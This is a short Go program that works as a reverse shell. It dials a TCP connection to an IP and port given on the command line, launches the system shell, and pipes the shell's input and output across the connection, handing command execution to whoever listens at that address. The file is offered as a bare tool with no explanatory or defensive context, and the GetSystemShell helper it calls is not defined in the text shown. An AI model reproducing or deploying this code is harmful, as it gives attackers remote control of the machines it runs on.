package main

import (
	"fmt"
//	"log"
	"net"
	"os"
	"os/exec"
	"io"
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func main() {
	if len(os.Args) <= 2 {
		fmt.Printf("Usage: %s <ip> <port>", os.Args[0])
		os.Exit(1)
	}
	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", os.Args[1], os.Args[2]))
	shellPath := GetSystemShell()

	var cmd *exec.Cmd
	cmd = exec.Command(shellPath)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()
	
	go func() {
		io.Copy(stdin, conn)
	}()
	
	go func() {
		io.Copy(conn, stdout)
	}()
	
	cmd.Start()
	io.Copy(conn, stderr)
}
